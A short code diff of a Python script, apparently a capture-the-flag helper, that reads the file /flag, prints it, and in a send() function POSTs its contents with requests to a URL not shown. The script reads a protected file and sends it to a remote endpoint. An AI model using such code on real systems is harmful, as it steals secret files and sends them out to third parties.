@@ -13,6 +13,9 @@ def  wfile():
     f.close()
     
 #wfile()
+f = open("/flag",'r')
+flag = f.readline()
+print(flag)
 
 import requests
 
@@ -21,7 +24,7 @@ def send():
     f = open("/flag",'r')
     flag = f.readline()
     data = {'flag': flag}  # replace with your POST data
-    print(data)
+    print(flag)
     response = requests.post(url, data=data)
     print(response.content)
 
